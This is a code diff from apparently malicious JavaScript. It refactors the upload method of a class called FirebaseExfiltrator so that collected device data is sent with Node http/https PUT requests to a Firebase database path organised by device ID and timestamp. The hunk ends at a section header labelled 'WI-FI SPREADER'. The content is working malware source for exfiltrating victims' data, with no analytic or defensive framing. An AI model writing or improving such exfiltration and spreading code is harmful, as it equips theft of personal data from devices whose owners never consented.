@@ -485,19 +485,39 @@ class FirebaseExfiltrator {
     this.databaseURL = config.firebase.databaseURL;
   }
 
-  async upload(data) {
+  upload(data) {
     const timestamp = Date.now();
     const deviceId = data.device_id || "unknown";
-    const url = `${this.databaseURL}/devices/${deviceId}/${timestamp}.json`;
-
-    const response = await fetch(url, {
+    const endpoint = `${this.databaseURL}/devices/${deviceId}/${timestamp}.json`;
+    const parsed = new URL(endpoint);
+    const payload = JSON.stringify(data);
+    const options = {
+      hostname: parsed.hostname,
+      path: parsed.pathname + (parsed.search || ""),
       method: "PUT",
-      body: JSON.stringify(data),
-    });
+      headers: {
+        "Content-Type": "application/json",
+        "Content-Length": Buffer.byteLength(payload),
+      },
+    };
+    const transport = parsed.protocol === "https:" ? https : http;
 
-    return response.ok;
+    return new Promise((resolve) => {
+      const req = transport.request(options, (res) => {
+        let body = "";
+        res.setEncoding("utf8");
+        res.on("data", (chunk) => (body += chunk));
+        res.on("end", () => {
+          resolve(res.statusCode >= 200 && res.statusCode < 300);
+        });
+      });
+      req.on("error", () => resolve(false));
+      req.write(payload);
+      req.end();
+    });
   }
 }
+
 // ============================================
 // WI-FI SPREADER
 // ============================================
